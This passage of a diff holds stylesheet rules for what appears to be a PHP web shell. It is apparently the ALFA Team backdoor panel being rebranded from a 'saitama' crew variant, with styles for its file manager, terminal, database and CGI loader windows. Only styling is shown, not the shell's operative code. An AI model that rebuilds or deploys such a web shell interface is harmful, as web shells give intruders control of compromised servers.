.tables-panel-ctl{position:absolute;color:#fff;padding:10px;z-index:1;border-radius:10px;top:45%;left:calc(17% + 10px);background-color:#009687;cursor:pointer}.tables-panel-ctl-min{left:-21px!important}.mysql-query-result-tabs div{display:inline-block;padding:5px;margin-right:2px;background:#133d51;color:#fff;cursor:pointer;transition:background-color .5s}.mysql-query-result-tabs div:hover{background-color:#a23939}.mysql-query-result-tabs div.mysql-query-selected-tab{background:red}table tr.tbl_row:nth-child(odd){background:#424040}.mysql-tables .tables-row{margin-left:26px}.mysql-main .mysql-query-results,.mysql-main .mysql-tables{float:left;height:100%;overflow:auto}.mysql-main .mysql-query-results{width:calc(80% + 4px);margin-left:5px;position:relative;overflow:unset}.mysql-main .mysql-query-results-fixed{width:100%}.mysql-main .mysql-query-results .mysql-query-content{height:89%;overflow:auto}.mysql-query-tab-hide{height:0!important;padding:0!important}.mysql-main .mysql-tables{width:19%;border-right:4px solid #ff0800}.mysql-main table td{vertical-align:top}.mysql-main .mysql-search-area table td{vertical-align:middle;padding:7px}.mysql-tables .block{position:relative;width:1.5em;height:1.5em;min-width:16px;min-height:16px;float:left}.mysql-tables div.block b,.mysql-tables div.block i{width:1.5em;height:1.7em;min-width:16px;min-height:8px;position:absolute;bottom:.7em;left:.75em;z-index:0}.mysql-tables .block i{display:block;border-left:1px solid #666;border-bottom:1px solid #666;position:relative;z-index:0}.mysql-tables .block b{display:block;height:.75em;bottom:0;left:.75em;border-left:1px solid #666}.mysql-tables div.block a,.mysql-tables div.block u{position:absolute;left:50%;top:50%;z-index:10}.mysql-tables div.block img{position:relative;top:-.6em;left:0;margin-left:-7px}.mysql-tables .clearfloat{clear:both}.mysql-tables ul{list-style-type:none;margin-left:0;padding:0}.mysql-tables ul li{white-space:nowrap;clear:both;min-height:16px}.mysql-tables .db_name{margin-left:10px}.mysql-tables .list_container{border-left:1px solid #666;margin-left:.75em;padding-left:.75em}.hide-db-tables{display:none}.mysql-main:after{content:"";display:table;clear:both}table.mysql-data-tbl{border:none!important;border-collapse:collapse!important}table.mysql-data-tbl tr th{padding:5px}table.mysql-data-tbl td{border-left:3px solid #305a8d;border-right:3px solid #305a8d;padding:6px}table.mysql-data-tbl td:first-child{border-left:none}table.mysql-data-tbl td:last-child{border-right:none}.mysql-insert-result,.mysql-structure-qres,.mysql-update-result{display:none;text-align:center;padding:10px;border:1px dashed;margin:22px}#saitama-copyright{margin-top:15px}.ic_b_plus{background-image:url(http://solevisible.com/icons/menu/b_plus.png)}.ic_b_minus{background-image:url(http://solevisible.com/icons/menu/b_minus.png)}
+.hlabale{color:#67abdf;border-radius:4px;border:1px solid #27979b;margin-left:7px;padding:2px}#tbl_sympphp tr{text-align:center}#PhpCode,.php-evals-ace,.view_ml_content{position:absolute;top:0;right:0;bottom:0;left:0;background:#1b292b26;top:50px}.editor-view{position:relative;height:100%}.view-content{position:absolute;overflow-y:auto;width:100%;height:93%}::-webkit-scrollbar-track{-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:10px;background-color:#000115}::-webkit-scrollbar{width:10px;background-color:#000115}::-webkit-scrollbar-thumb{border-radius:10px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#1e82b5}.editor-file-name{margin-left:29px;margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.editor-icon{position:absolute}.is_active{background:rgba(49,55,93,.77);border-radius:10px}.history-list{height:88%;overflow-y:auto}.opt-title{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);color:#2fd051;font-size:25px;font-family:monospace}.options_min_badge{visibility:hidden;text-align:center;right:30px;color:#fff;background:#2a8a24;padding:6px;border-radius:50%;width:15px;height:15px;display:inline-block;position:absolute;top:-7px}#cgiloader-minimized,#database_window-minimized,#editor-minimized,#options_window-minimized{display:block;position:fixed;right:-30px;width:30px;height:30px;top:30%;z-index:9999}.minimized-wrapper{position:relative;background:#0e304a;width:44px;height:130px;cursor:pointer;border-bottom-left-radius:5px;border-top-left-radius:5px}.minimized-text{transform:rotate(-90deg);color:wheat;font-size:x-large;display:inline-block;position:absolute;right:-51px;width:129px;top:-10px;border-top-left-radius:4%;height:56px;padding:3px}.close-button,.editor-minimize{height:26px;width:38px;right:7px;background:#1d5673;cursor:pointer;position:absolute;box-sizing:border-box;line-height:50px;display:inline-block;top:17px;border-radius:100px}.editor-minimize{right:50px}.close-button:after,.close-button:before,.editor-minimize:before{transform:rotate(-45deg);content:"";position:absolute;top:63%;right:6px;margin-top:-5px;margin-left:-25px;display:block;height:4px;width:27px;background-color:rgba(216,207,207,.75);transition:all .25s ease-out}.editor-minimize:before{transform:rotate(0)}.close-button:after{transform:rotate(-135deg)}.close-button:hover:after,.close-button:hover:before,.editor-minimize:hover:before{background-color:red}.close-button:hover,.editor-minimize:hover{background-color:rgba(39,66,80,.96)}#cgiloader,#database_window,#editor,#options_window{display:none;position:fixed;top:0;width:100%;height:100%;z-index:20}.editor-wrapper{width:100%;height:100%;position:relative;top:1%}.editor-header{width:97%;background:rgba(21,66,88,.93);height:37px;margin-left:13px;position:relative;border-top-left-radius:15px;border-top-right-radius:15px}.editor-path{position:absolute;font-size:x-large;margin-left:10px;top:6px;color:#00ff7f}.editor-modal{position:relative;top:0;background-color:rgba(0,1,23,.95);height:90%;margin-left:20%;margin-right:2%;border:2px #0e304a solid}.editor-explorer{width:19%;height:90%;background-color:rgba(0,1,23,.94);position:absolute;z-index:2;left:1%;border:2px #0e304a solid}.editor-controller{position:relative;top:-13px}.file-holder{position:relative;width:100%;height:30px}.file-holder>.history{position:absolute;color:#03b3a3;cursor:pointer;left:5px;font-size:18px;font-family:sans-serif;width:89%;height:100%;z-index:3;border-radius:10px;transition:background-color .6s ease-out}.file-holder>.history-close{display:block;opacity:0;position:absolute;right:2px;width:20px;top:4px;text-align:center;cursor:pointer;color:#fff;background:red;border-radius:100px;font-family:monospace;z-index:10;transition:opacity .6s ease-out;font-size:15px;height:19px}.file-holder>.history:hover{background-color:#646464}.editor-explorer>.hheader{position:relative;color:#14ff07;border-bottom:2px #206aa2 solid;text-align:center;font-family:sans-serif;margin-bottom:10px;height:55px}.editor-search{position:absolute;bottom:7px;left:31px}.hheader-text{position:absolute;left:8px;top:2px}.history-clear{position:absolute;right:8px;top:2px;cursor:pointer}.editor-body{position:relative;margin-left:3px;height:100%}.editor-anim-close{-webkit-animation:editorClose .8s ease-in-out forwards;-moz-animation:editorClose .8s ease-in-out forwards;-ms-animation:editorClose .8s ease-in-out forwards;animation:editorClose .8s ease-in-out forwards}@keyframes editorClose{0%{visibility:1;opacity:1}100%{visibility:0;opacity:0}}.editor-anim-minimize{-webkit-animation:editorMinimize .8s ease-in-out forwards;-moz-animation:editorMinimize .8s ease-in-out forwards;-ms-animation:editorMinimize .8s ease-in-out forwards;animation:editorMinimize .8s ease-in-out forwards}@keyframes editorMinimize{0%{right:0;opacity:1}100%{right:-2000px;opacity:0}}.editor-anim-show{-webkit-animation:editorShow .8s ease-in-out forwards;-moz-animation:editorShow .8s ease-in-out forwards;-ms-animation:editorShow .8s ease-in-out forwards;animation:editorShow .8s ease-in-out forwards}@keyframes editorShow{0%{right:-2000px;opacity:0}100%{right:0;opacity:1}}.minimized-show{-webkit-animation:minimizeShow .8s ease-in-out forwards;-moz-animation:minimizeShow .8s ease-in-out forwards;-ms-animation:minimizeShow .8s ease-in-out forwards;animation:minimizeShow .8s ease-in-out forwards}@keyframes minimizeShow{0%{right:-30px;opacity:0}100%{right:0;opacity:1}}.minimized-hide{-webkit-animation:minimizeHide .8s ease-in-out forwards;-moz-animation:minimizeHide .8s ease-in-out forwards;-ms-animation:minimizeHide .8s ease-in-out forwards;animation:minimizeHide .8s ease-in-out forwards}@keyframes minimizeHide{0%{right:0;opacity:1}100%{right:-30px;opacity:0}}.solevisible-text:hover{-webkit-text-shadow:0 0 25px #0f0;-moz-text-shadow:0 0 25px #0f0;-ms-text-shadow:0 0 25px #0f0;text-shadow:0 0 25px #0f0}.update-holder{position:fixed;top:0;background-color:rgba(0,24,29,.72);width:100%;height:100%}.update-content{position:relative}.update-content>a{text-decoration:none;position:absolute;color:rgba(103,167,47,.77);left:24%;margin-top:7%;font-size:40px}.update-close{position:absolute;right:0;margin-right:23px;top:10px;font-size:27px;background-color:#130f50;width:5%;border-radius:100px;cursor:pointer;border:2px #0e265a solid}.update-close:hover{border:2px #25ff00 solid;color:red}.filestools{height:auto;width:auto;color:#67abdf;font-size:12px;font-family:Verdana,Geneva,sans-serif}@-moz-document url-prefix(){#search-input{width:173px}.editor-path{top:3px}}.filters-holder{padding:5px;padding-left:10px}.filters-holder input{width:200px}.filters-holder span{color:#8bc7f7}#rightclick_menu{width:175px;visibility:hidden;opacity:0;position:fixed;background:#0f304a;color:#555;font-family:sans-serif;font-size:11px;-webkit-transition:opacity .5s ease-in-out;-moz-transition:opacity .5s ease-in-out;-ms-transition:opacity .5s ease-in-out;-o-transition:opacity .5s ease-in-out;transition:opacity .5s ease-in-out;-webkit-box-shadow:-1px 0 17px 0 #8b8b8c;-moz-box-shadow:-1px 0 17px 0 #8b8b8c;box-shadow:-1px 0 17px 0 #8b8b8c;padding:0;border:1px solid #737373;border-radius:10px}#rightclick_menu a{display:block;color:#fff;font-weight:bolder;text-decoration:none;padding:6px 8px 6px 30px;position:relative;padding-left:40px}#rightclick_menu a i.fa,#rightclick_menu a img{height:20px;font-size:17px;width:20px;position:absolute;left:5px;top:2px;padding-left:5px}#rightclick_menu a span{color:#bcb1b3;float:right}#rightclick_menu a:hover{color:#fff;background:#3879d9}#rightclick_menu hr{border:1px solid #ebebeb;border-bottom:0}.cl-popup-fixed{position:fixed;top:0;left:0;width:100%;height:100%;background:#201e1ead}#shortcutMenu-holder{position:absolute;top:40%;left:50%;transform:translate(-50%,-50%);background:#1f1e1edb;height:190px;width:500px;color:#fff}#shortcutMenu-holder>.popup-head{background:#207174;padding:6px;border-top:10px;text-align:center;font-family:sans-serif;color:#fff}#shortcutMenu-holder>form{padding:10px}#shortcutMenu-holder>form>label{display:block}#shortcutMenu-holder>form>input{width:99%;height:24px;margin-top:4px;color:#fff;outline:0;font-size:16px}#shortcutMenu-holder>.popup-foot{float:right;height:30px;margin-right:8px}#shortcutMenu-holder>.popup-foot>button{height:100%;cursor:pointer;color:#fff;outline:0}.php-terminal-output{overflow:auto;height:86%;border:1px solid #1e5673;border-radius:10px}.cmd-history-holder{visibility:hidden;opacity:0;position:absolute;color:#dff3d5;background:#093d58;top:-300px;height:300px;width:calc(69% + -11px);border-radius:10px 10px 0 0;left:calc(2% - 9px);transition:visibility .5s,opacity .5s linear}.cmd-history-holder .commands-history-header{background:#37504e;text-align:center;border-radius:10px 10px 0 0}.cmd-history-icon{width:27px;top:6px;left:calc(69% + 5px);position:absolute;cursor:pointer}.history-cmd-line{padding:4px;border-bottom:1px dashed;cursor:pointer}.history-cmd-line:hover{background:#961111}#myUL,#myUL ul{list-style-type:none}#myUL{margin:0;padding:0}.box{cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.box::before{content:"\2610";color:#000;display:inline-block;margin-right:6px}.check-box::before{content:"\2611";color:#1e90ff}.nested{display:none}.active{display:block}.flag-holder>img{width:20px;vertical-align:middle;padding-left:6px}#options_window .content_options_holder .options_holder{position:relative;display:none;overflow:auto;min-height:300px;max-height:calc(100vh - 100px)}#options_window .content_options_holder .options_holder .header{min-height:50vh}#options_window .content_options_holder .options_holder.option_is_active{display:block}#options_window .content_options_holder .options_tab{padding:5px;margin-left:14px;margin-right:30px;background:#000;border-bottom:7px solid #0f304a;border-left:7px solid #0f304a;border-right:7px solid #0f304a;overflow-x:auto;white-space:nowrap}#filesman_tabs .filesman_tab img,#options_window .content_options_holder .options_tab .tab_name img,.editor-tab-name img,.sql-tabs .sql-tabname img,.terminal-tabs .terminal-tab img{width:10px;vertical-align:middle;margin-left:5px}#filesman_tabs .filesman_tab,#options_window .content_options_holder .options_tab .tab_name,.editor-tab-name,.sql-tabs .sql-newtab,.sql-tabs .sql-tabname,.terminal-tabs .terminal-tab{display:inline-block;background-color:#133d51;border-radius:4px;padding:5px;color:#fff;margin-right:3px;padding:5px;cursor:pointer;margin-bottom:1px;transition:background-color .5s}#filesman_tabs .filesman_tab{min-width:55px;text-align:center}#filesman_tabs .filesman_tab:hover,#options_window .content_options_holder .options_tab .tab_name:hover,.editor-tab-name:hover,.sql-tabs .sql-tabname:hover,.terminal-tabs .terminal-tab:hover{background-color:#a23939}.editor-tabs,.sql-tabs,.terminal-tabs{padding:5px;overflow-x:auto;white-space:nowrap}.options-loader-holder{position:absolute;top:0;left:0;width:100%;height:100%;background:#2b2626c7;z-index:11}.options-loader-holder img{position:absolute;top:32%;left:45%;transform:translate(-50%,-50%);width:100px;animation:spin 2s infinite}#filesman_tabs .filesman_tab.filesman-tab-active,#options_window .content_options_holder .options_tab .tab_name.tab_is_active,.editor-tab-name.editor-tab-active,.sql-tabname.sql-active-tab,.terminal-tab.active-terminal-tab{background-color:#009688}.tab-is-done{animation:2s tab_change_color infinite step-end}.stopAjax{color:#fff;font-size:20px;display:inline-block;padding:10px;cursor:pointer}#a_loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#2b2626c7;z-index:99}.fmanager-row>td{position:relative}.fmanager-row .symlink_path{position:fixed;max-width:100%;background-color:#0f304a;border-radius:10px;font-size:15px;padding:8px;color:#fdf4f4;border:1px solid #8a8a8a;z-index:1;pointer-events:none}.archive-icons{vertical-align:middle}.archive-type-dir{font-weight:bolder}.archive-type-file{font-weight:unset}.archive-name{cursor:pointer}.archive_dir_holder a{color:#0f0;font-weight:bolder;cursor:pointer}.archive_dir_holder a:hover{color:#fff}.editor-content{height:100%}.editor-content-holder{height:90%}.editor-contents{display:none;position:relative;height:100%}.editor-contents.editor-content-active{display:block}.history-panel-controller{position:absolute;color:#fff;padding:10px;z-index:1000;border-radius:10px;top:50%;left:19%;background-color:#009687;cursor:pointer}.sql-content{display:none;position:relative;min-height:300px}.sql-content.sql-active-content{display:block}.pages-holder{padding:7px}.pages-number{display:inline-block;margin-left:10px}.pages-holder .pages-number a.page-number{padding:5px;background:#0f304a;margin-right:8px;cursor:pointer;width:33px;display:inline-block;text-align:center;border-radius:5px;color:#fff;transition:background .5s}.active-page-number{background:#10925c!important}.pages-number a.page-number:hover{background:#8a8a8a}.terminal-content{height:100%}.terminal-content,.terminal-tab{display:none}.terminal-content.active-terminal-content{display:block;position:relative}.terminal-btn-fontctl{background:#009688;width:50px;color:#fff;font-weight:bolder;outline:0;cursor:pointer}.alert-area{max-height:100%;position:fixed;bottom:5px;left:20px;right:20px;z-index:9999}.alert-box{font-size:16px;color:#fff;background:rgba(0,0,0,.9);line-height:1.3em;padding:10px 15px;margin:5px 10px;position:relative;border-radius:5px;transition:opacity .5s ease-in;-webkit-animation:alert-shake .5s ease-in-out;animation:alert-shake .5s ease-in-out}.alert-content-title{font-weight:700}.alert-box.alert-success{background:rgba(56,127,56,.89)}.alert-error{background:rgba(191,54,54,.89)}.alert-box.hide{opacity:0}.alert-close{background:0 0;width:12px;height:12px;position:absolute;top:15px;right:15px}.alert-close:after,.alert-close:before{content:"";width:15px;border-top:solid 2px #fff;position:absolute;top:5px;right:-1px;display:block}.alert-close:before{transform:rotate(45deg)}.alert-close:after{transform:rotate(135deg)}.alert-close:hover:after,.alert-close:hover:before{border-top:solid 2px #d8d8d8}@media (max-width:767px) and (min-width:481px){.alert-area{left:100px;right:100px}}@media (min-width:768px){.alert-area{width:350px;left:auto;right:0;z-index:9999}}@keyframes tab_change_color{0%{background-color:#133d51}50%{background-color:green}}@-webkit-keyframes alert-shake{0%{-webkit-transform:translateX(0)}20%{-webkit-transform:translateX(-10px)}40%{-webkit-transform:translateX(10px)}60%{-webkit-transform:translateX(-10px)}80%{-webkit-transform:translateX(10px)}100%{-webkit-transform:translateX(0)}}@keyframes alert-shake{0%{transform:translateX(0)}20%{transform:translateX(-10px)}40%{transform:translateX(10px)}60%{transform:translateX(-10px)}80%{transform:translateX(10px)}100%{transform:translateX(0)}}.textEffect{position:absolute;width:500px;top:-10px;animation:alert-shake .5s ease-in-out;animation-iteration-count:2}.alfateam-loader-text{position:absolute;color:#46bb45;top:23%;left:49%;transform:translate(-50%,-50%);font-size:40px;letter-spacing:7px}.alfa-ajax-error{position:absolute;color:#ff0a0a;top:50%;left:50%;transform:translate(-50%,-50%);font-size:30px}.connection-hist-table{margin-left:auto;margin-right:auto;text-align:justify;border-collapse:collapse}.connection-hist-table td,.connection-hist-table th{border:1px solid #ddd;text-align:left;padding:8px}.connection-his-btn{margin-bottom:10px;padding:5px;background:#206920;color:#fff;border:none;outline:0;cursor:pointer;font-weight:700;transition:background .3s}.connection-his-btn.connection-delete{margin:unset;padding:5px;background:red;width:33px;border-radius:3px;transition:background .3s}.connection-delete:hover{background:#f56969!important}.connection-his-btn:hover{background:#30b330}#up_bar_holder{position:fixed;z-index:100000;width:100%}#filesman_tabs{padding:8px;border:1px solid #0e304a;color:#67abdf;overflow-x:auto;white-space:nowrap}.sortable-ghost{opacity:.5;background:#c8ebfb}.folder-tab-icon{width:16px!important}#filesman-tab-full-path{display:none;position:absolute;pointer-events:none;background:#163746;padding:7px;color:#0f0;border-radius:10px;min-width:58px;z-index:10}#filesman-tab-full-path::after{content:"";position:absolute;top:100%;left:35px;margin-left:-5px;border-width:5px;border-style:solid;pointer-events:none;border-color:#163746 transparent transparent transparent}.mysql-main{height:84vh;position:relative}.mysql-hide-content{display:none}.mysql-query-result-tabs{margin-bottom:10px;padding:3px;border-bottom:4px solid #0f304a}.mysql-main .tables-panel-ctl{position:absolute;color:#fff;padding:10px;z-index:1;border-radius:10px;top:45%;left:calc(17% + 10px);background-color:#009687;cursor:pointer}.tables-panel-ctl-min{left:-21px!important}.mysql-query-result-tabs div{display:inline-block;padding:5px;margin-right:2px;background:#133d51;color:#fff;cursor:pointer;transition:background-color .5s}.mysql-query-result-tabs div:hover{background-color:#a23939}.mysql-query-result-tabs div.mysql-query-selected-tab{background:red}table tr.tbl_row:nth-child(odd){background:#424040}.mysql-tables .tables-row{margin-left:26px}.mysql-main .mysql-query-results,.mysql-main .mysql-tables{float:left;height:100%;overflow:auto}.mysql-main .mysql-query-results{width:calc(80% + 4px);margin-left:5px;position:relative;overflow:unset}.mysql-main .mysql-query-results-fixed{width:100%}.mysql-main .mysql-query-results .mysql-query-content{height:89%;overflow:auto}.mysql-query-tab-hide{height:0!important;padding:0!important}.mysql-main .mysql-tables{width:19%;border-right:4px solid #0e304a}.mysql-main table td{vertical-align:top}.mysql-main .mysql-search-area table td{vertical-align:middle;padding:7px}.mysql-tables .block{position:relative;width:1.5em;height:1.5em;min-width:16px;min-height:16px;float:left}.mysql-tables div.block b,.mysql-tables div.block i{width:1.5em;height:1.7em;min-width:16px;min-height:8px;position:absolute;bottom:.7em;left:.75em;z-index:0}.mysql-tables .block i{display:block;border-left:1px solid #666;border-bottom:1px solid #666;position:relative;z-index:0}.mysql-tables .block b{display:block;height:.75em;bottom:0;left:.75em;border-left:1px solid #666}.mysql-tables div.block a,.mysql-tables div.block u{position:absolute;left:50%;top:50%;z-index:10}.mysql-tables div.block img{position:relative;top:-.6em;left:0;margin-left:-7px}.mysql-tables .clearfloat{clear:both}.mysql-tables ul{list-style-type:none;margin-left:0;padding:0}.mysql-tables ul li{white-space:nowrap;clear:both;min-height:16px}.mysql-tables .db_name{margin-left:10px}.mysql-tables .list_container{border-left:1px solid #666;margin-left:.75em;padding-left:.75em}.hide-db-tables{display:none}.mysql-main:after{content:"";display:table;clear:both}table.mysql-data-tbl{border:none!important;border-collapse:collapse!important}table.mysql-data-tbl tr th{padding:5px}table.mysql-data-tbl td{border-left:3px solid #305a8d;border-right:3px solid #305a8d;padding:6px}table.mysql-data-tbl td:first-child{border-left:none}table.mysql-data-tbl td:last-child{border-right:none}.mysql-insert-result,.mysql-structure-qres,.mysql-update-result{display:none;text-align:center;padding:10px;border:1px dashed;margin:22px}#alfa-copyright{margin-top:15px}.ic_b_plus{background-image:url(http://solevisible.com/icons/menu/b_plus.png)}.ic_b_minus{background-image:url(http://solevisible.com/icons/menu/b_minus.png)}
 <?php echo '
 @keyframes spin {from {transform: rotate(0deg);}to{transform: rotate(360deg);}}
 @-webkit-keyframes spin {from {-webkit-transform: rotate(0deg);}to {-webkit-transform: rotate(360deg);}}
 @-moz-keyframes spin {from {-moz-transform: rotate(0deg);}to {-moz-transform: rotate(360deg);}}
 @-ms-keyframes spin {from {-ms-transform: rotate(0deg);}to {-ms-transform: rotate(360deg);}}
-#saitamaloader{'.$csscode.'width:100px;height:100px;}
+#alfaloader{'.$csscode.'width:100px;height:100px;}
 #a_loader img{'.$csscode.'width:150px;height:150px;position:fixed;z-index:999999;top: 31%;left: 45%;}
-.ajaxarea{display:none;border:1px solid #ff0800;color:#BF40BF}.up_bar{margin-bottom: 2px;transition:width 2s;background-color:red;width:0;height:8px;display:none;}#hidden_sh{background-color:#ff0800;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole{background-color:#000;background-image:url(https://saitamacrewxploit.xyz/images/oks.png);background-position:center;background-attachment:fixed;background-repeat:no-repeat}.header{height:auto;width:auto;border:7px solid #ff0800;color:'.saitama_getColor("header_values").';font-size:12px;font-family:Verdana,Geneva,sans-serif}.header a{text-decoration:none;}.filestools a{color:#0F0;text-decoration:none}.filestools a:hover{color:#FFF;text-decoration:none;}span{font-weight:bolder;color:#FFF}.txtfont{font-family:"Comic Sans MS";font-size:small;color:#fff;display:inline-block}.txtfont_header{font-family:"Comic Sans MS";font-size:large;display:inline-block;color:#59cc33}.tbltxt{font-family:"Comic Sans MS";color:#fff;font-size:small;display:inline-block}input[type="file"]{display:none}.inputfile{border:1px solid #ff0800;background:transparent;box-shadow:0 0 4px #ff0800;border-radius:4px;height:20px;width:250px;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;display:inline-block;overflow:hidden}.inputfile:hover{box-shadow:0 0 4px #ff0800;border:1px solid #ff0800;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}.inputfile span,.inputfile strong{padding:2px;padding-left:10px}.inputfile span{color:#00ffff;width:90px;min-height:2em;display:inline-block;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;vertical-align:top;float:left}.inputfile strong{background-image:url('.__showicon('saitamamini').');background-repeat:no-repeat;background-position:float;height:100%;width:109px;color:#fff;background-color:#ff0800;display:inline-block;float:right}.inputfile:focus strong,.inputfile.has-focus strong,.inputfile:hover strong{background-color:#46647A}.button{padding:3px}#addup,.button{outline:none;cursor:pointer;border:1px solid #ff0800;background:transparent;box-shadow:0 0 4px #ff0800;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px;background-color:#000;color:green;border-radius:100px}#addup:hover,.button:hover{box-shadow:0 0 4px #ff0800;border:1px solid #ff0800;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:disabled:hover{cursor:not-allowed}td{padding:'.($GLOBALS['DB_NAME']['show_icons']=='1'?'0':'1').'px}.myCheckbox{padding-left:2px}.myCheckbox label{display:inline-block;cursor:pointer;position:relative}.myCheckbox input[type=checkbox]{display:none}.myCheckbox label:before{content:"";display:inline-block;width:14px;height:13px;position:absolute;background-color:#aaa;box-shadow:inset 0 2px 3px 0 rgba(0,0,0,.3),0 1px 0 0 rgba(255,255,255,.8)}.myCheckbox label{margin-bottom:15px;padding-right:17px}.myCheckbox label:before{border-radius:100px}input[type=checkbox]:checked + label:before{content:"";background-color:#ff0800;background-image:url('.__showicon('saitamamini').');background-repeat:no-repeat;background-position:50% 50%;background-size:14px 14px;box-shadow:0 0 4px #0F0}#meunlist{font-family:Verdana,Geneva,sans-serif;color:#FFF;width:auto;border-right-width:7px;border-left-width:7px;height:auto;font-size:12px;font-weight:700;border-top-width:0;border-color:#ff0800;border-style:solid}.whole #meunlist ul{text-align:center;list-style-type:none;margin:0;padding:5px 5px 7px 2px}.whole #meunlist li{margin:0;padding:0;display:inline}.whole #meunlist a{font-family:arial,sans-serif;font-size:14px;text-decoration:none;font-weight:700;clear:both;width:100px;margin-right:-6px;border-right-width:1px;border-right-style:solid;border-right-color:#FFF;padding:3px 15px}.foot{font-family:Verdana,Geneva,sans-serif;margin:0;padding:0;width:100%;text-align:center;font-size:12px;color:#ff0800;border-right-width:7px;border-left-width:7px;border-bottom-width:7px;border-bottom-style:solid;border-right-style:solid;border-right-style:solid;border-left-style:solid;border-color:#ff0800}#text{text-align:center}input[type=submit]{cursor:pointer;background-image:url('.__showicon('btn').');background-repeat:no-repeat;background-position:50% 50%;background-size:23px 23px;background-color:#000;width:30px;height:30px;border:1px solid #ff0800;border-radius:100px}textarea{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #ff0800;background:transparent;box-shadow:0 0 4px #ff0800;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}textarea:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #ff0800;border:1px solid #ff0800;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text],input[type=number],.saitama_custom_cmd_btn{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #ff0800;background:transparent;box-shadow:0 0 4px #ff0800;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}input[type=submit]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #ff0800;border:2px solid #ff0800;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #ff0800;border:1px solid #ff0800;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}select{padding:3px;width:162px;color:#FFE;text-shadow:#000 0 2px 7px;border:1px solid #ff0800;background:#000;text-decoration:none;box-shadow:0 0 4px #ff0800;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}select:hover{border:1px solid #ff0800;box-shadow:0 0 4px #ff0800;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}
-.foottable{width: 300px;font-weight: bold;'.(!@is_writable($GLOBALS['cwd'])?'}.dir{background-color:red;}':'}').'.main th{text-align:left;}.main a{color: #FFF;}.main tr:hover{background-color:#646464 !important;}.ml1{ border:1px solid #ff0800;padding:5px;margin:0;overflow: auto; }.bigarea{ width:99%; height:300px; }.saitama_custom_cmd_btn {padding: 5px;color: #fff;cursor: pointer;}.ajaxarea.filesman-active-content {display: block;}'.saitamaCssLoadColors().'
+.ajaxarea{display:none;border:1px solid #0E304A;color:#67ABDF}.up_bar{margin-bottom: 2px;transition:width 2s;background-color:red;width:0;height:8px;display:none;}#hidden_sh{background-color:#0E304A;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole{background-color:#000;background-image:url(http://solevisible.com/images/alfabg.png);background-position:center;background-attachment:fixed;background-repeat:no-repeat}.header{height:auto;width:auto;border:7px solid #0E304A;color:'.alfa_getColor("header_values").';font-size:12px;font-family:Verdana,Geneva,sans-serif}.header a{text-decoration:none;}.filestools a{color:#0F0;text-decoration:none}.filestools a:hover{color:#FFF;text-decoration:none;}span{font-weight:bolder;color:#FFF}.txtfont{font-family:"Comic Sans MS";font-size:small;color:#fff;display:inline-block}.txtfont_header{font-family:"Comic Sans MS";font-size:large;display:inline-block;color:#59cc33}.tbltxt{font-family:"Comic Sans MS";color:#fff;font-size:small;display:inline-block}input[type="file"]{display:none}.inputfile{border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;border-radius:4px;height:20px;width:250px;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;display:inline-block;overflow:hidden}.inputfile:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}.inputfile span,.inputfile strong{padding:2px;padding-left:10px}.inputfile span{color:#25ff00;width:90px;min-height:2em;display:inline-block;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;vertical-align:top;float:left}.inputfile strong{background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:float;height:100%;width:109px;color:#fff;background-color:#0E304A;display:inline-block;float:right}.inputfile:focus strong,.inputfile.has-focus strong,.inputfile:hover 